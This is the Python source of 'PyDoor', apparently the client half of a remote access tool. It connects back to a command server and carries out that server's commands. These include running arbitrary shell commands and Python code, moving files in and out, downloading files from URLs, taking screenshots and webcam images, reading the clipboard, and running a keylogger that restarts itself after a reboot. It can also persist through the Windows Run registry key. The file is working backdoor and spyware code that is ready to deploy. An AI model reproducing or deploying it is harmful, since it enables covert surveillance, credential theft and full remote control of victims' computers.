import getpass
import json
import logging
import os
import platform
import shutil
import socket
import subprocess
import sys
import threading
import time
import traceback
from io import BytesIO, StringIO
from pydoc import help
from zipfile import ZipFile

import cv2
import psutil
import pyperclip
import pyscreeze
import requests
from cryptography.fernet import Fernet

if getattr(sys, 'frozen', False):
    CLIENT_PATH = os.path.dirname(sys.executable)
elif __file__:
    CLIENT_PATH = os.path.dirname(os.path.abspath(__file__))

os.chdir(CLIENT_PATH)

if platform.system() == 'Windows':
    import ctypes
    from winreg import OpenKey, CloseKey, SetValueEx, DeleteValue
    from winreg import HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
    STARTUP_REG_NAME = 'PyDoor'
    LOG = os.path.join(CLIENT_PATH + '\\log.log')
else:
    LOG = os.path.join(CLIENT_PATH + '/log.log')

try:
    from pynput.keyboard import Listener
    _pynput = True
except Exception:
    _pynput = False

logging.basicConfig(filename=LOG, level=logging.INFO, format='%(asctime)s: %(message)s')
logging.info('Client Started.')


def read_file(path, block_size=32768) -> bytes:
    """ Generator for reading files """
    with open(path, 'rb') as f:
        while True:
            piece = f.read(block_size)
            if piece:
                yield piece
            else:
                return


def reverse_readline(filename, buf_size=16384) -> str:
    """A generator that returns the lines of a file in reverse order"""

    # Credit: https://stackoverflow.com/a/23646049/10625567

    with open(filename) as fh:
        segment = None
        offset = 0
        fh.seek(0, os.SEEK_END)
        file_size = remaining_size = fh.tell()
        while remaining_size > 0:
            offset = min(file_size, offset + buf_size)
            fh.seek(file_size - offset)
            buffer = fh.read(min(remaining_size, buf_size))
            remaining_size -= buf_size
            lines = buffer.split('\n')
            if segment is not None:
                if buffer[-1] != '\n':
                    lines[-1] += segment
                else:
                    yield segment
            segment = lines[0]
            for index in range(len(lines) - 1, 0, -1):
                if lines[index]:
                    yield lines[index]
        if segment is not None:
            yield segment


def errors(ERROR, line=True) -> str:
    """ Error Handler """
    error_class = ERROR.__class__.__name__
    error_msg = '%s:' % error_class
    try:
        error_msg += ' {0}'.format(ERROR.args[0])
    except Exception: pass
    if line:
        try:
            _, _, tb = sys.exc_info()
            line_number = traceback.extract_tb(tb)[-1][1]
            error_msg += ' (line {0})'.format(line_number)
        except Exception: pass
    return error_msg


def add_startup() -> list:
    """ Add Client to startup """
    # returns [True/False, None/error]
    if platform.system() != 'Windows':
        return [False, 'Startup feature is only for Windows']
    if getattr(sys, 'frozen', False):
        PATH = sys.executable
    elif __file__:
        PATH = os.path.abspath(__file__)
    try:
        user = HKEY_CURRENT_USER
        value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        key = OpenKey(user, value, 0, KEY_ALL_ACCESS)
        SetValueEx(key, STARTUP_REG_NAME, 0, REG_SZ, PATH)
        CloseKey(key)
    except Exception as e:
        return [False, errors(e)]
    logging.info('Added Client to Startup')
    return [True, None]


def remove_startup() -> list:
    """ Remove Client from Startup """
    # returns [True/False, None/error]
    if platform.system() != 'Windows':
        return [False, 'Startup feature is only for Windows.']
    try:
        user = HKEY_CURRENT_USER
        value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        key = OpenKey(user, value, 0, KEY_ALL_ACCESS)
        DeleteValue(key, STARTUP_REG_NAME)
        CloseKey(key)
    except FileNotFoundError:
        # File was never registered.
        # Still returns True, since it's not in startup
        pass
    except WindowsError as e:
        return [False, errors(e)]
    logging.info('Removed Client from Startup')
    return [True, None]


def kill(proc_pid) -> None:
    """ Kill Process by ID """
    process = psutil.Process(proc_pid)
    for proc in process.children(recursive=True):
        proc.kill()
    process.kill()


def json_dumps(data) -> bytes:
    """ Dumps json data and encodes it """
    return json.dumps(data).encode()


def json_loads(data):
    """ Decodes and then loads json data """
    return json.loads(data.decode())


def OnKeyboardEvent(event):
    logging.info(str(event))

if _pynput:
    KeyListener = Listener(on_press=OnKeyboardEvent)
    # Check the state of the keylogger from logs
    if os.path.isfile(LOG):
        for line in reverse_readline(LOG):
            if 'Started Keylogger' in line:
                KeyListener.start()
                break
            if 'Stopped Keylogger' in line:
                break


class Client(object):

    def __init__(self, host='127.0.0.1', port=8000, key=b'QWGlyrAv32oSe_iEwo4SuJro_A_SEc_a8ZFk05Lsvkk=') -> None:
        self.serverHost = host
        self.serverPort = port
        self.socket = None
        self.Fer = Fernet(key)
        if platform.system() == 'Windows':
            self._pwd = ' & cd'
        else:
            self._pwd = '; pwd'

    def socket_create(self) -> None:
        """ Create a socket """
        try:
            self.socket = socket.socket()
        except Exception as e:
            logging.error(errors(e))
        return

    def socket_connect(self) -> None:
        """ Connect to a remote socket using RSA and agreeing on a AES key"""
        try:
            self.socket.connect((self.serverHost, self.serverPort))
        except (ConnectionRefusedError, TimeoutError):
            raise
        except Exception as e:
            logging.error(errors(e))
            raise
        try:
            self.socket.send(socket.gethostname().encode())
        except Exception as e:
            logging.error(errors(e))

    def recvall(self, n) -> bytes:
        """ Function to receive n amount of bytes"""
        # returns bytes/None
        data = b''
        while len(data) < n:
            packet = self.socket.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def receive(self) -> bytes:
        """ Receives Buffer Size and Data from Server Encrypted with AES """
        # returns bytes
        length = int(self.Fer.decrypt(self.socket.recv(2048)).decode())
        self.socket.send(b'RECEIVED')
        return self.Fer.decrypt(self.recvall(length))

    def send(self, data) -> None:
        """ Sends Buffer Size and Data to Server Encrypted with AES """
        # returns None
        encrypted = self.Fer.encrypt(data)
        self.socket.send(self.Fer.encrypt(str(len(encrypted)).encode()))
        self.socket.recv(1024)
        self.socket.send(encrypted)

    def check_perms(self, _file, mode) -> bool:
        try:
            with open(_file, mode):
                pass
        except Exception as e:
            self.send(b'FILE_TRANSFER_ERROR')
            self.receive()
            self.send(errors(e).encode())
            return False
        return True

    def send_file(self, file_to_transfer) -> None:
        """ Send file to Server """
        # returns None
        if not self.check_perms(file_to_transfer, 'rb'):
            return
        for block in read_file(file_to_transfer):
            self.send(block)
            self.receive()
        self.send(b'FILE_TRANSFER_DONE')
        self.receive()
        self.send(b'File Transferred Successfully')
        logging.info('Transferred {} to Server'.format(file_to_transfer))
        return

    def receive_file(self, save_as) -> None:
        """ Receive File from Server"""
        # returns None
        if not self.check_perms(save_as, 'wb'):
            return
        self.send(b'RECEIVED')
        with open(save_as, 'wb') as f:
            while 1:
                data = self.receive()
                if data == b'FILE_TRANSFER_DONE':
                    self.send(b'File Transferred Successfully')
                    break
                f.write(data)
                self.send(b'RECEIVED')
        logging.info('Transferred {} to Client'.format(save_as))
        return

    def receive_commands(self) -> None:
        """ Receives Commands from Server """
        while True:
            data = json_loads(self.receive())
            # data[0]: command
            # data[1]: data1
            # data[2]: data2
            # ...

            if data[0] == 'GETCWD':
                self.send(os.getcwdb())
                continue

            if data[0] == 'LIST':
                self.socket.send(b' ')
                continue

            if data[0] == 'PLATFORM':
                self.send(platform.system().encode())
                continue

            if data[0] == 'LOG_FILE':
                self.send(LOG.encode())
                continue

            if data[0] == '_INFO':
                self.send(json_dumps([platform.system(), os.path.expanduser('~'), getpass.getuser()]))
                continue

            if data[0] == 'FROZEN':
                self.send(json_dumps(getattr(sys, 'frozen', False)))
                continue

            if data[0] == 'EXEC':
                old_stdout = sys.stdout
                redirected_output = sys.stdout = StringIO()
                error = None
                try:
                    exec(data[1])
                except Exception as e:
                    error = errors(e, line=False)
                finally:
                    sys.stdout = old_stdout
                self.send(json_dumps([redirected_output.getvalue(), error]))
                continue

            if data[0] == 'RESTART_SESSION':
                self.send(json_dumps(True))
                break

            if data[0] == 'DISCONNECT':
                self.send(json_dumps(True))
                self.socket.close()
                sys.exit(0)

            if data[0] == 'ADD_STARTUP':
                self.send(json_dumps(add_startup()))
                continue

            if data[0] == 'REMOVE_STARTUP':
                self.send(json_dumps(remove_startup()))
                continue

            if data[0] == 'LOCK':
                if platform.system() == 'Windows':
                    self.send(json_dumps(True))
                    ctypes.windll.user32.LockWorkStation()
                else:
                    self.send(json_dumps(False))
                continue

            if data[0] == 'SHUTDOWN':
                if platform.system() != 'Windows':
                    self.send(json_dumps(False))
                    continue
                self.send(json_dumps(True))
                subprocess.Popen('shutdown /s /t 0', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(5)
                break

            if data[0] == 'RESTART':
                if platform.system() != 'Windows':
                    self.send(json_dumps(False))
                    continue
                self.send(json_dumps(True))
                subprocess.Popen('shutdown /r /t 0', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(5)
                break

            if data[0] == 'RECEIVE_FILE':
                self.send_file(data[1])
                continue

            if data[0] == 'SEND_FILE':
                self.receive_file(data[1])
                continue

            if data[0] == 'ZIP_FILE':
                logging.info('Zipping File: {}'.format(data[2]))
                try:
                    with ZipFile(data[1], 'w') as ziph:
                        ziph.write(data[2])
                except Exception as e:
                    self.send(json_dumps([False, errors(e)]))
                    continue
                self.send(json_dumps([True, None]))
                continue

            if data[0] == 'ZIP_DIR':
                logging.info('Zipping Folder: {}'.format(data[2]))
                try:
                    shutil.make_archive(data[1], 'zip', data[2])
                except Exception as e:
                    self.send(json_dumps([False, errors(e)]))
                    continue
                self.send(json_dumps([True, None]))
                continue

            if data[0] == 'UNZIP':
                logging.info('Unzipping: {}'.format(data[1]))
                try:
                    with ZipFile(data[1], 'r') as ziph:
                        ziph.extractall()
                except Exception as e:
                    self.send(json_dumps([False, errors(e)]))
                    continue
                self.send(json_dumps([True, None]))
                continue

            if data[0] == 'DOWNLOAD':
                logging.info('Downloading "{}" from {}'.format(data[2], data[1]))
                try:
                    r = requests.get(data[1])
                    with open(data[2], 'wb') as f:
                        f.write(r.content)
                except Exception as e:
                    self.send(json_dumps([False, errors(e, line=False)]))
                    continue
                self.send(json_dumps([True, None]))
                continue

            if data[0] == 'INFO':
                self.send('User: {}\nOS: {} {} ({}) ({})\nFrozen (.exe): {}\n'.format(getpass.getuser(), platform.system(),
                    platform.release(), platform.platform(), platform.machine(), getattr(sys, 'frozen', False)).encode())
                continue

            if data[0] == 'SCREENSHOT':
                logging.info('Taking Screenshot')
                try:
                    with BytesIO() as output:
                        img = pyscreeze.screenshot()
                        img.save(output, format='PNG')
                        content = output.getvalue()
                except Exception as e:
                    self.send(b'ERROR')
                    self.receive()
                    self.send(errors(e).encode())
                    continue
                self.send(content)
                continue

            if data[0] == 'WEBCAM':
                logging.info('Capturing Webcam')
                vc = cv2.VideoCapture(0)
                s, img = vc.read()
                vc.release()
                if s:
                    is_success, arr = cv2.imencode('.png', img)
                    if is_success:
                        self.send(arr.tobytes())
                        logging.info('Captured Webcam image')
                        continue
                self.send(b'ERROR')
                continue

            if data[0] == 'START_KEYLOGGER':
                if not _pynput:
                    self.send(json_dumps(False))
                    continue
                if not KeyListener.running:
                    KeyListener.start()
                    logging.info('Started Keylogger')
                self.send(json_dumps(True))
                continue

            if data[0] == 'KEYLOGGER_STATUS':
                if not _pynput or not KeyListener.running:
                    self.send(json_dumps(False))
                    continue
                self.send(json_dumps(True))
                continue

            if data[0] == 'STOP_KEYLOGGER':
                if not _pynput:
                    self.send(json_dumps(False))
                    continue
                if KeyListener.running:
                    logging.info('Stopped Keylogger')
                    KeyListener.stop()
                    threading.Thread.__init__(KeyListener) # re-initialise thread
                self.send(json_dumps(True))
                continue

            if data[0] == 'COPY':
                try:
                    pyperclip.copy(data[1])
                    self.send(json_dumps([True, None]))
                except Exception as e:
                    self.send(json_dumps([False, errors(e)]))
                continue

            if data[0] == 'PASTE':
                try:
                    self.send(json_dumps([True, pyperclip.paste()]))
                except Exception as e:
                    self.send(json_dumps([False, errors(e)]))
                continue

            if data[0] == 'SHELL':
                split_command = data[1].split(' ')[0].strip().lower()
                if split_command in ['cd', 'chdir']:
                    process = subprocess.Popen(data[1] + self._pwd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    error = process.stderr.read().decode()
                    if error == "":
                        output = process.stdout.read().decode()
                        newlines = output.count('\n')
                        # Command should only return one line (cwd)
                        if newlines > 1:
                            process = subprocess.Popen(data[1], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                            self.send(json_dumps(['ERROR', process.stdout.read().decode()]))
                            continue
                        os.chdir(output.strip())
                        self.send(json_dumps([os.getcwd()]))
                        continue
                    self.send(json_dumps(['ERROR', error]))
                    continue

                process = subprocess.Popen(data[1], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                for line in iter(process.stdout.readline, ""):
                    if line == b'':
                        break
                    self.send(line.replace(b'\n', b''))
                    if self.receive() == b'QUIT':
                        kill(process.pid)
                        break
                self.send(process.stderr.read())
                self.receive()
                self.send(b'DONE')
                continue


def main(RETRY_TIMER : int = 30) -> None:
    """ Run Client """
    # RETRY_TIMER: Time to wait before trying to reconnect
    client = Client()
    client.socket_create()
    while True:
        try:
            client.socket_connect()
        except:
            time.sleep(RETRY_TIMER)
        else:
            break
    try:
        client.receive_commands()
    except Exception as e:
        logging.critical(errors(e))


if __name__ == '__main__':

    # Add Client to Startup when Client is run
    # add_startup()
    while 1:
        main(RETRY_TIMER=10)
